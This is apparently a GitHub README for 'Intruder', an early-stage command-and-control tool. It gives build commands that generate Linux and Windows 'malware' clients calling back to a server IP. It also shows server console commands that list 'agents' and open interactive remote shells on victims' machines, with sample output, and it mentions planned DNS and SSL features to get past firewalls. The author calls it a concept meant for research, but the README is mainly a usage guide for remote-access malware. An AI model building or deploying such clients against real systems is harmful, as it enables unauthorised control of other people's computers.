<h1 align="center">
  <img src="https://github.com/daemoncibsec/intruder/blob/main/intruder-header.png" alt="intruder" width="1000px">
  <br>
</h1>

Intruder is a tool for remote communication between computers. At the moment, **is just a concept of a C2 server**, that allows remote control over the clients, and **though it's functional, it doesn't implement yet the functionalities that characterize this type of sotfware**. In the future, I'll implement functionalities such as SSL encryption or DNS communication to bypass defensive software such as firewalls, but at the moment, **it's in development**.

## Installation

```bash
git clone https://github.com/daemoncibsec/intruder.git
cd intruder
pip install -r requirements.txt
```

Additionally, you can make it a binary in Linux systems using these "cython" library, so you don't have to move between folders, and have it implemented in your system as well as with other commands.

- For the client (Linux Malware, Python-coded version):

```bash
./generate_intruder python 192.168.0.1 6789
```

- For the client (Linux Malware, C-coded version):

```bash
./generate_intruder c 192.168.0.1 6789
```

- For the client (Windows Malware, no C implementation for the Windows client available):

```powershell
pyinstaller -F .\intruder.py
```

- For the server:

```bash
pip install cython
python3 -m cython server_intruder.py --embed
gcc -Os $(python3-config --includes) server_intruder.c -o marrow $(python3-config --ldflags --embed)
```

## Usage/Examples

- To start the server:

```bash
python3 server_intruder.py
```

- To start the client, you will need to specify the IP address of the server inside the script:

```bash
# Using the python interpreter
python3 intruder.py
```

In case you have the script compiled with cython and gcc:


- To start the server:


```bash
./server_intruder
```

- To start the client, you will need to specify the IP address of the server inside the script *before compilation* using `generate_intruder` or editing the source code:


```bash
# Using the Python compiled code
./intruder

#Using the C compiled code
./intrunix
```

## Intruder's terminal manual

The intruder server is, literally, a terminal that allows you to use certain commands in order to execute certain actions. Once started the server, it automaticly starts a background process that runs along with the server (a thread) that gathers connections and allows the interaction with the connected clients. In order to see the clients connected to the server, the host must use the command `!list`.

Example.
```bash
>> !list

No agents indexed.
```

If the `No agents indexed` text appears using the command shown above, it means there are no agents clients connected to the server. The clients that are connected to the server are called "agents". When an agent is available, it is displayed in the terminal like this after using `!list`:

```bash
>> !list

Agents gathered:
  0: ('127.0.0.1', 52642)
```

Each agent posses an unique identified (in this case, since it's the first agent we've gathered, it has the ID '0') that is used to interact with the victim's system. Also, along with the ID of the agent, we get to view it's IP address and port number to be able to identify multiple connections from a single victim. To be able to obtain access to the victim's system, we use the `!intrude` command like it's shown below.

```bash
>> !intrude 0

Shell@127.0.0.1:52642 >>>
```

Doing this spawns an interactive shell that allows us to control remotely our victim's system like we'd do with a terminal. We can use most of the commands available on the system that create output such as "ls", "id", "pwd", "whoami", etc. However, due to the amount of commands there are in Unix and Windows systems, I haven't been able yet to test if it has any flaw. If it does, please be kind to contact me using my email address (available on my Github profile) or write on the "Issues" part of the repository to be able to fix any problem using the Remote Command Execution tool (the shell), and if you want, you'll be added to the "Testers" part of the description of this repository. To execute a command, it is as simple as to type it into the terminal, and it'll give you the output until a maximum of 4096 characters (to avoid buffer overflows).

```bash
Shell@127.0.0.1:52642 >>> whoami

usuario

Shell@127.0.0.1:52642 >>> pwd

/home/usuario/daemon/projects/intruder

Shell@127.0.0.1:52642 >>> ls -l 1 

Command execution failed.

Shell@127.0.0.1:52642 >>> ls -l1

total 112
-rwxrwxr-x 1 usuario usuario  1556 abr 14 14:24 generate_intruder
-rw-rw-r-- 1 usuario usuario  8703 ene 27 09:40 intruder-header.png
-rw-rw-r-- 1 usuario usuario 32850 ene 27 09:40 intruder-logo.png
-rw-rw-r-- 1 usuario usuario  1968 abr 14 14:26 intruder.py
-rw-rw-r-- 1 usuario usuario  3833 abr 14 14:23 intrunix.c
-rw-rw-r-- 1 usuario usuario 35149 ene 27 09:40 LICENSE
-rwxrwxr-x 1 usuario usuario  5024 abr 14 18:19 README.md
-rw-rw-r-- 1 usuario usuario   122 ene 27 09:44 requirements.txt
-rwxrwxr-x 1 usuario usuario  3142 abr 14 13:46 server_intruder.py

Shell@127.0.0.1:52642 >>>
```

Once you're done with a target, you can exit **the shell** using the `!close` command inside of it like it's shown below.

```bash
Shell@127.0.0.1:52642 >>> !close

>> !list

Agents gathered:
  0: ('127.0.0.1', 52642)
```

After exiting a shell from a victim, the connection to that victim will still be available. You can gather as many agents as you want distributing the agent software, however, due to how in an early stage it is, I don't recommend using it for anything that isn't research, development, or testing, since it has almost no security implementations for the server, and the connection can be really easily traced. Whenever you're done with the server, you can terminate it either by using the `!exit` command or pressing `Ctrl + C`, which forces the program to stop. An example is shown below.

```bash
>> !exit


Terminating server...
Server terminated.

```

## Known vulnerabilities and bugs

- When starting the server, the port 6789 doesn't check which software the client is using to connect to the server, which allows the client to manipulate the information being sent to the server. This can't harm the computer, but it causes poor reception of requests.
- The server doesn't check for duplicated conections from a client, which means that a client can spam the server with connections potentially crashing it (there is also no command implemented that allows the host to disconnect someone from the server, so, yeah, I'll have to fix that).
- The client's software data is fully unencrypted, which means that a competitive reverse engineer could discover the IP of the server it is connecting to really easily.

## Authors

- [@daemoncibsec](https://www.github.com/daemoncibsec)

## Testers

- [@javij27](https://mrtecno.jjimenezg.es/)
